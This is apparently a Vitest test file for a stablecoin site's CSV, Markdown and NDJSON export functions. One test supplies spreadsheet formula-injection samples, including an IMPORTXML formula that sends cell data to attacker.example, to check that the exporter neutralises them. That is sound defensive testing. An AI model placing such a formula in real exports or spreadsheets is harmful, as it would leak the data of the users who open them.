// @vitest-environment jsdom

import { describe, expect, it, vi } from "vitest";
import { buildCsvWithPreamble, downloadCsvWithPreamble } from "@/lib/exports/csv";
import { buildMarkdownWithPreamble } from "@/lib/exports/markdown";
import { buildNdjsonWithPreamble } from "@/lib/exports/ndjson";
import {
  formatPreambleCsv,
  formatPreambleMarkdown,
  formatPreambleNdjson,
} from "@/lib/exports/preamble";
import { PREAMBLE, expectBlob, useDownloadHarness } from "./exports.test-support";

describe("buildCsvWithPreamble", () => {
  it("prepends the `#` preamble, then header, then escaped rows", () => {
    const csv = buildCsvWithPreamble(
      [{ name: "USD Coin", note: "quoted, value" }],
      [
        { header: "Name", accessor: (row) => row.name },
        { header: "Note", accessor: (row) => row.note },
      ],
      PREAMBLE,
    );

    expect(csv).toBe(
      [
        "# Pharos pharos.watch | Endpoint: stablecoins | As of: 2026-05-16T12:00:00.000Z | URL: https://pharos.watch/ | Methodology: safety-score v7.25",
        "Name,Note",
        'USD Coin,"quoted, value"',
      ].join("\n"),
    );
  });

  it("renders null and undefined accessor values as empty cells", () => {
    const csv = buildCsvWithPreamble(
      [{ a: null as string | null, b: undefined as string | undefined }],
      [
        { header: "A", accessor: (row) => row.a },
        { header: "B", accessor: (row) => (row.b == null ? null : row.b) },
      ],
      PREAMBLE,
    );

    const lines = csv.split("\n");
    expect(lines[2]).toBe(",");
  });

  it("neutralizes formula-leading spreadsheet cells before CSV quoting", () => {
    const csv = buildCsvWithPreamble(
      [
        {
          symbol: '=IMPORTXML("https://attacker.example/?q="&A1)',
          mechanism: "+SUM(1,1)",
          spaced: "  @malicious",
          carriageReturn: "\r=malicious",
          ordinaryNegativeNumber: -1,
        },
      ],
      [
        { header: "Symbol", accessor: (row) => row.symbol },
        { header: "Mechanism", accessor: (row) => row.mechanism },
        { header: "Spaced", accessor: (row) => row.spaced },
        { header: "CarriageReturn", accessor: (row) => row.carriageReturn },
        { header: "OrdinaryNegativeNumber", accessor: (row) => row.ordinaryNegativeNumber },
      ],
      PREAMBLE,
    );

    expect(csv.split("\n")[2]).toBe(
      [
        '"\'=IMPORTXML(""https://attacker.example/?q=""&A1)"',
        '"\'+SUM(1,1)"',
        "'  @malicious",
        '"\'\r=malicious"',
        "-1",
      ].join(","),
    );
  });
});

describe("downloadCsvWithPreamble", () => {
  const harness = useDownloadHarness("blob:pharos-csv");
  const { createObjectURL, revokeObjectURL } = harness;

  it("creates a BOM-prefixed CSV blob, dated filename, and defers revoke", async () => {
    downloadCsvWithPreamble(
      [{ name: "USDC" }],
      [{ header: "Name", accessor: (row) => row.name }],
      "stablecoins",
      PREAMBLE,
    );

    expect(createObjectURL).toHaveBeenCalledTimes(1);
    const blob = createObjectURL.mock.calls[0]?.[0];
    expectBlob(blob);
    expect(blob.type).toBe("text/csv;charset=utf-8;");
    const bytes = new Uint8Array(await blob.arrayBuffer());
    expect(Array.from(bytes.slice(0, 3))).toEqual([239, 187, 191]); // UTF-8 BOM
    expect(harness.clickSpy).toHaveBeenCalledTimes(1);
    const anchor = harness.clickSpy.mock.instances[0] as HTMLAnchorElement | undefined;
    expect(anchor?.download).toBe("stablecoins-2026-05-16.csv");
    expect(revokeObjectURL).not.toHaveBeenCalled();

    await vi.runOnlyPendingTimersAsync();

    expect(revokeObjectURL).toHaveBeenCalledWith("blob:pharos-csv");
  });
});

describe("buildMarkdownWithPreamble", () => {
  it("emits a blockquote preamble, a header row, a separator, and one row per record", () => {
    const md = buildMarkdownWithPreamble(
      [
        { name: "USDC", supply: 1234 },
        { name: "USDT", supply: 5678 },
      ],
      [
        { header: "Name", accessor: (row) => row.name },
        { header: "Supply", accessor: (row) => row.supply },
      ],
      PREAMBLE,
    );

    expect(md).toBe(
      [
        "> Pharos pharos.watch | Endpoint: stablecoins | As of: 2026-05-16T12:00:00.000Z | URL: https://pharos.watch/ | Methodology: safety-score v7.25",
        "",
        "| Name | Supply |",
        "| --- | --- |",
        "| USDC | 1234 |",
        "| USDT | 5678 |",
      ].join("\n"),
    );
  });

  it("escapes pipe characters and flattens newlines in cell values", () => {
    const md = buildMarkdownWithPreamble(
      [{ note: "a|b\nc" }],
      [{ header: "Note", accessor: (row) => row.note }],
      PREAMBLE,
    );
    const lines = md.split("\n");
    expect(lines.at(-1)).toBe("| a\\|b c |");
  });

  it("escapes backslashes before table pipes", () => {
    const md = buildMarkdownWithPreamble(
      [{ note: "a\\|b\r\nc" }],
      [{ header: "Note", accessor: (row) => row.note }],
      PREAMBLE,
    );
    const lines = md.split("\n");
    expect(lines.at(-1)).toBe("| a\\\\\\|b c |");
  });
});

describe("buildNdjsonWithPreamble", () => {
  it("emits one `_meta` line followed by one JSON object per row", () => {
    const ndjson = buildNdjsonWithPreamble(
      [
        { name: "USDC", supply: 1234 },
        { name: "USDT", supply: 5678 },
      ],
      [
        { header: "Name", accessor: (row) => row.name },
        { header: "Supply", accessor: (row) => row.supply },
      ],
      PREAMBLE,
    );

    const lines = ndjson.split("\n");
    expect(lines).toHaveLength(3);
    expect(JSON.parse(lines[0]!)).toEqual({
      _meta: {
        endpoint: "stablecoins",
        asOfISO: "2026-05-16T12:00:00.000Z",
        sourceUrl: "https://pharos.watch/",
        methodologyLabel: "safety-score v7.25",
      },
    });
    expect(JSON.parse(lines[1]!)).toEqual({ Name: "USDC", Supply: 1234 });
    expect(JSON.parse(lines[2]!)).toEqual({ Name: "USDT", Supply: 5678 });
  });

  it("renders null accessor values as JSON null", () => {
    const ndjson = buildNdjsonWithPreamble(
      [{ a: null as string | null }],
      [{ header: "A", accessor: (row) => row.a }],
      PREAMBLE,
    );
    const lines = ndjson.split("\n");
    expect(JSON.parse(lines[1]!)).toEqual({ A: null });
  });
});

describe("ExportPreamble formatters", () => {
  it("preserves named upstream generations and explicit unknown provenance in every format", () => {
    const provenance = { ...PREAMBLE, sourceGenerations: { stablecoins: PREAMBLE.asOfISO, reportCards: null } };
    expect(formatPreambleCsv(provenance)).toContain("stablecoins=2026-05-16T12:00:00.000Z; reportCards=unknown");
    expect(formatPreambleMarkdown(provenance)).toContain("reportCards=unknown");
    expect(JSON.parse(formatPreambleNdjson(provenance))._meta.sourceGenerations).toEqual(provenance.sourceGenerations);
  });

  it("renders an optional source assessment clock only when known", () => {
    const withClock = { ...PREAMBLE, sourceAssessedISO: "2026-05-16T12:00:05.000Z" };
    expect(formatPreambleCsv(withClock)).toContain(
      "As of: 2026-05-16T12:00:00.000Z | Source assessed: 2026-05-16T12:00:05.000Z | URL:",
    );
    expect(formatPreambleCsv(PREAMBLE)).not.toContain("Source assessed:");
  });
});
